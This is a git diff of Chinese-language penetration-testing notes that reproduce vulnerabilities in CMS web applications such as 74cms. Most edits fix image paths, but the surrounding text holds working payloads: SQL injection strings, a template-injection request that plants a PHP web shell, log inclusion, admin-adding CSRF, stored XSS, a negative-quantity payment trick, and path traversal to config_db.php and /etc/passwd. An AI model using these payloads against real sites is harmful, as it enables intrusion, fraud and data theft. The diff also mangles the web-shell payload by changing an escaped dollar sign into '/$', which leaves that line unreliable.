@@ -12,11 +12,11 @@
 
 在【联系】下方的留言处插入payload
 
-![Snipaste_2022-10-12_10-43-55](images\Snipaste_2022-10-12_10-43-55.jpg)前台触发
+![Snipaste_2022-10-12_10-43-55](images/Snipaste_2022-10-12_10-43-55.jpg)前台触发
 
 
 
-![Snipaste_2022-10-12_10-45-13](images\Snipaste_2022-10-12_10-45-13.jpg)
+![Snipaste_2022-10-12_10-45-13](images/Snipaste_2022-10-12_10-45-13.jpg)
 
 
 
@@ -24,7 +24,7 @@
 
 
 
-![Snipaste_2022-10-12_10-46-06](images\Snipaste_2022-10-12_10-46-06.jpg)
+![Snipaste_2022-10-12_10-46-06](images/Snipaste_2022-10-12_10-46-06.jpg)
 
 
 
@@ -32,11 +32,11 @@
 
 随意点开一篇文章
 
-![Snipaste_2022-10-12_11-01-21](images\Snipaste_2022-10-12_11-01-21.jpg)
+![Snipaste_2022-10-12_11-01-21](images/Snipaste_2022-10-12_11-01-21.jpg)
 
 在cid处存在漏洞
 
-![Snipaste_2022-10-12_11-02-10](.\images\Snipaste_2022-10-12_11-02-10.jpg)
+![Snipaste_2022-10-12_11-02-10](images/Snipaste_2022-10-12_11-02-10.jpg)
 
 
 
@@ -46,7 +46,7 @@
 and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
 ```
 
-![Snipaste_2022-10-12_11-03-41](.\images\Snipaste_2022-10-12_11-03-41.jpg)
+![Snipaste_2022-10-12_11-03-41](images/Snipaste_2022-10-12_11-03-41.jpg)
 
 
 
@@ -54,7 +54,7 @@ and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
 
 输入1'即可引起报错
 
-![Snipaste_2022-10-12_10-54-18](.\images\Snipaste_2022-10-12_10-54-18.jpg)
+![Snipaste_2022-10-12_10-54-18](images/Snipaste_2022-10-12_10-54-18.jpg)
 
 
 
@@ -62,11 +62,11 @@ and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
 1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #
 ```
 
-![Snipaste_2022-10-12_10-52-55](images\Snipaste_2022-10-12_10-52-55.jpg)
+![Snipaste_2022-10-12_10-52-55](images/Snipaste_2022-10-12_10-52-55.jpg)
 
 
 
-![Snipaste_2022-10-12_10-53-06](images\Snipaste_2022-10-12_10-53-06.jpg)
+![Snipaste_2022-10-12_10-53-06](images/Snipaste_2022-10-12_10-53-06.jpg)
 
 
 
@@ -80,7 +80,7 @@ and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
 
 在前台留言处插入payload
 
-![Snipaste_2022-10-12_13-28-40](images\Snipaste_2022-10-12_13-28-40.jpg)
+![Snipaste_2022-10-12_13-28-40](images/Snipaste_2022-10-12_13-28-40.jpg)
 
 
 
@@ -88,7 +88,7 @@ and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
 
 
 
-![Snipaste_2022-10-12_13-30-44](images\Snipaste_2022-10-12_13-30-44.jpg)
+![Snipaste_2022-10-12_13-30-44](images/Snipaste_2022-10-12_13-30-44.jpg)
 
 
 
@@ -133,7 +133,7 @@ and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
 
 管理员在登录的情况下访问了该文件即可成功添加一个管理员用户，攻击者使用添加的管理员可成功登录后台
 
-![Snipaste_2022-10-12_15-22-13](images\Snipaste_2022-10-12_15-22-13.jpg)
+![Snipaste_2022-10-12_15-22-13](images/Snipaste_2022-10-12_15-22-13.jpg)
 
 ### 74cms
 
@@ -152,10 +152,10 @@ index.php?m=home&a=assign_resume_tpl
 
 post:
 
-variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
+variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(/$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
 ```
 
-![Snipaste_2022-10-12_14-11-03](images\Snipaste_2022-10-12_14-11-03.jpg)
+![Snipaste_2022-10-12_14-11-03](images/Snipaste_2022-10-12_14-11-03.jpg)
 
 
 
@@ -173,7 +173,7 @@ post:
 variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 ```
 
-![Snipaste_2022-10-12_14-12-21](images\Snipaste_2022-10-12_14-12-21.jpg)
+![Snipaste_2022-10-12_14-12-21](images/Snipaste_2022-10-12_14-12-21.jpg)
 
 
 
@@ -181,7 +181,7 @@ variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 
 
 
-![Snipaste_2022-10-12_14-14-44](images\Snipaste_2022-10-12_14-14-44.jpg)
+![Snipaste_2022-10-12_14-14-44](images/Snipaste_2022-10-12_14-14-44.jpg)
 
 
 
@@ -230,7 +230,7 @@ variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 
 将该文件诱使管理员打开访问，管理员在登录的情况下访问了该文件即可成功添加一个管理员用户，攻击者使用添加的管理员可成功登录后台
 
-![Snipaste_2022-10-12_15-17-09](images\Snipaste_2022-10-12_15-17-09.jpg)
+![Snipaste_2022-10-12_15-17-09](images/Snipaste_2022-10-12_15-17-09.jpg)
 
 
 
@@ -244,13 +244,13 @@ variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 
 注册普通用户，在资料修改处随意插入XSS的payload
 
-![Snipaste_2022-10-11_17-03-26](images\Snipaste_2022-10-11_17-03-26.jpg)
+![Snipaste_2022-10-11_17-03-26](images/Snipaste_2022-10-11_17-03-26.jpg)
 
 
 
 管理员查看会员信息即可触发
 
-![Snipaste_2022-10-11_17-06-50](images\Snipaste_2022-10-11_17-06-50.jpg)
+![Snipaste_2022-10-11_17-06-50](images/Snipaste_2022-10-11_17-06-50.jpg)
 
 
 
@@ -258,19 +258,19 @@ variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 
 在产品展示里选择产品购买，付款方式选择站内扣款
 
-![Snipaste_2022-10-11_17-11-47](images\Snipaste_2022-10-11_17-11-47.jpg)
+![Snipaste_2022-10-11_17-11-47](images/Snipaste_2022-10-11_17-11-47.jpg)
 
 提交订单抓包，把qty（订单数量）的值修改为负数
 
-![Snipaste_2022-10-11_17-13-18](images\Snipaste_2022-10-11_17-13-18.jpg)
+![Snipaste_2022-10-11_17-13-18](images/Snipaste_2022-10-11_17-13-18.jpg)
 
 即可成功下单并反向充值
 
-![Snipaste_2022-10-11_17-14-45](images\Snipaste_2022-10-11_17-14-45.jpg)
+![Snipaste_2022-10-11_17-14-45](images/Snipaste_2022-10-11_17-14-45.jpg)
 
 
 
-![Snipaste_2022-10-11_17-15-20](images\Snipaste_2022-10-11_17-15-20.jpg)
+![Snipaste_2022-10-11_17-15-20](images/Snipaste_2022-10-11_17-15-20.jpg)
 
 
 
@@ -288,7 +288,7 @@ variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 /include/thumb.php?dir=.....///http/.....///config/config_db.php
 ```
 
-![Snipaste_2022-10-13_15-03-00](images\Snipaste_2022-10-13_15-03-00.jpg)
+![Snipaste_2022-10-13_15-03-00](images/Snipaste_2022-10-13_15-03-00.jpg)
 
 
 
@@ -298,7 +298,7 @@ variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log  #日志文件为日期
 /include/thumb.php?dir=.....///http/.....///.....///.....///.....///.....////etc/passwd
 ```
 
-![Snipaste_2022-10-13_16-05-27](images\Snipaste_2022-10-13_16-05-27.jpg)
+![Snipaste_2022-10-13_16-05-27](images/Snipaste_2022-10-13_16-05-27.jpg)
 
 
 
